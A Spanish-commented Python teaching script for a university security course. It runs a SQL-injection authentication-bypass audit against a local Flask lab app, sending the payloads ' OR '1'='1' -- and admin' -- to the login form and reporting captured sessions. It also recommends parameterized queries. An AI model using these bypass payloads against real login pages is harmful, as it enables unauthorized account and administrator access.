#!/usr/bin/env python3
"""
=============================================================================
SCRIPT DE AUDITORÍA Y PRUEBA DE CONCEPTO: INYECCIÓN SQL (SQLi)
Asignatura: Seguridad Informática - 7° Semestre TI
Carrera: Tecnologías de la Información

OBJETIVO DIDÁCTICO:
Demostrar el impacto de la concatenación insegura de cadenas SQL en formularios
de autenticación (Authentication Bypass) y validar la eficacia de las
técnicas de mitigación (Prepared Statements / Consultas Parametrizadas).

AVISO ÉTICO:
Este script ha sido diseñado exclusivamente para pruebas sobre el entorno local
controlado del laboratorio (127.0.0.1). Su empleo contra sistemas no autorizados
constituye un delito informático.
=============================================================================
"""

import sys
import argparse
import requests
from urllib.parse import urljoin

# Configurar encoding seguro para terminales Windows
if hasattr(sys.stdout, "reconfigure"):
    sys.stdout.reconfigure(encoding="utf-8", errors="replace")
if hasattr(sys.stderr, "reconfigure"):
    sys.stderr.reconfigure(encoding="utf-8", errors="replace")

# Códigos de color ANSI para presentación en consola
GREEN = "\033[92m"
RED = "\033[91m"
YELLOW = "\033[93m"
BLUE = "\033[94m"
CYAN = "\033[96m"
BOLD = "\033[1m"
RESET = "\033[0m"


class SQLiAuditor:
    def __init__(self, base_url="http://127.0.0.1:5000"):
        self.base_url = base_url.rstrip("/")
        self.login_url = urljoin(self.base_url, "/login")
        self.toggle_url = urljoin(self.base_url, "/toggle-security")
        self.dashboard_url = urljoin(self.base_url, "/dashboard")

    def print_banner(self):
        print(f"{CYAN}{BOLD}")
        print("=" * 72)
        print("   MODULO DE AUDITORIA DE INYECCION SQL (SQLi) - HOLIDAYS LAB")
        print("   Seguridad Informatica | 7mo Semestre TI")
        print("=" * 72)
        print(f"{RESET}")
        print(f"[*] Objetivo: {self.base_url}")
        print(f"[*] Endpoint de autenticacion: {self.login_url}\n")

    def test_connection(self):
        """Verifica si el servidor Flask objetivo está activo."""
        try:
            r = requests.get(self.base_url, timeout=3)
            print(f"[{GREEN}+{RESET}] Conexion con el servidor web establecida exitosamente (HTTP {r.status_code}).")
            return True
        except requests.exceptions.ConnectionError:
            print(f"[{RED}!{RESET}] Error: No fue posible conectar con {self.base_url}.")
            print(f"    Asegurate de haber iniciado el servidor con: {BOLD}python app_vulnerable.py{RESET}")
            return False

    def attempt_login(self, username_or_email, password, description):
        """Ejecuta una petición POST de autenticación y evalúa el resultado."""
        session = requests.Session()
        payload = {
            "username_or_email": username_or_email,
            "password": password
        }

        print(f"\n{BOLD}--- Prueba: {description} ---{RESET}")
        print(f"    Payload Usuario/Email : {YELLOW}{repr(username_or_email)}{RESET}")
        print(f"    Payload Contrasena    : {YELLOW}{repr(password)}{RESET}")

        response = session.post(self.login_url, data=payload, allow_redirects=True)

        # Analizar si la sesión fue iniciada
        is_dashboard = "/dashboard" in response.url or "Bienvenido," in response.text
        has_session_cookie = "session" in session.cookies

        if is_dashboard and has_session_cookie:
            # Extraer nombre si está visible en el HTML
            user_detected = "Desconocido"
            if "Bienvenido," in response.text:
                try:
                    user_detected = response.text.split("Bienvenido,")[1].split("!")[0].strip()
                except Exception:
                    pass

            print(f"    {GREEN}{BOLD}[VULNERABLE / ACCESO CONCEDIDO]{RESET}")
            print(f"    Codigo de Estado      : HTTP {response.status_code}")
            print(f"    URL Final             : {response.url}")
            print(f"    Identidad Capturada   : {BOLD}{user_detected}{RESET}")
            print(f"    Cookie de Sesion      : {list(session.cookies.keys())}")
            return True, user_detected
        else:
            print(f"    {RED}[ACCESO DENEGADO / MITIGADO]{RESET}")
            print(f"    Codigo de Estado      : HTTP {response.status_code}")
            print(f"    Resultado             : No se genero sesion (Payload bloqueado o invalido).")
            return False, None

    def run_comprehensive_audit(self):
        """Ejecuta una batería completa de pruebas automáticas."""
        if not self.test_connection():
            sys.exit(1)

        print(f"\n{BLUE}{BOLD}[1/4] Prueba de Autenticacion Legitima Valida{RESET}")
        self.attempt_login(
            "turista01",
            "ViajeroSeguro#7",
            "Credenciales correctas de cliente regular"
        )

        print(f"\n{BLUE}{BOLD}[2/4] Prueba de Autenticacion Invalida (Linea Base){RESET}")
        self.attempt_login(
            "turista01",
            "ContrasenaIncorrecta123",
            "Credenciales deliberadamente erroneas"
        )

        print(f"\n{BLUE}{BOLD}[3/4] Prueba de Explotacion SQLi: Bypass Tautologico (' OR '1'='1' --){RESET}")
        print("    Mecanica: La condicion 1=1 siempre evalua a Verdadero.")
        print("    Los caracteres '--' comentan el resto de la consulta original.")
        vuln_1, user_1 = self.attempt_login(
            "' OR '1'='1' --",
            "clave_cualquiera",
            "Bypass de login generico sin conocer credenciales"
        )

        print(f"\n{BLUE}{BOLD}[4/4] Prueba de Explotacion SQLi: Suplantacion Especifica de Admin (admin' --){RESET}")
        print("    Mecanica: Se fija el usuario 'admin' y se omite la validacion de contrasena.")
        vuln_2, user_2 = self.attempt_login(
            "admin' --",
            "inventada",
            "Suplantacion directa de la cuenta de administrador"
        )

        print("\n" + "=" * 72)
        print(f"{BOLD}RESUMEN DE RESULTADOS DE LA AUDITORIA:{RESET}")
        if vuln_1 or vuln_2:
            print(f"  {RED}{BOLD}[!] ALERTA CRITICA: Se detecto vulnerabilidad activa de Inyeccion SQL.{RESET}")
            print("      Impacto: Evasion total de autenticacion (OWASP A03:2021).")
            print("      Cuentas comprometidas:", user_1 or user_2)
            print("      Recomendacion: Implementar consultas parametrizadas (Prepared Statements).")
        else:
            print(f"  {GREEN}{BOLD}[OK] ENTORNO SEGURO: Los intentos de Inyeccion SQL fueron neutralizados.{RESET}")
            print("      El sistema no permitio evasion de autenticacion.")
        print("=" * 72 + "\n")


def main():
    parser = argparse.ArgumentParser(
        description="Script didactico de prueba de concepto para SQL Injection (Holidays Lab)"
    )
    parser.add_argument(
        "--target",
        default="http://127.0.0.1:5000",
        help="URL base del servidor Flask objetivo (Por defecto: http://127.0.0.1:5000)"
    )
    parser.add_argument(
        "--payload",
        help="Payload SQLi manual personalizado para probar en el campo de usuario"
    )

    args = parser.parse_args()
    auditor = SQLiAuditor(base_url=args.target)
    auditor.print_banner()

    if args.payload:
        auditor.test_connection()
        auditor.attempt_login(args.payload, "password_dummy", f"Payload manual: {args.payload}")
    else:
        auditor.run_comprehensive_audit()


if __name__ == "__main__":
    main()
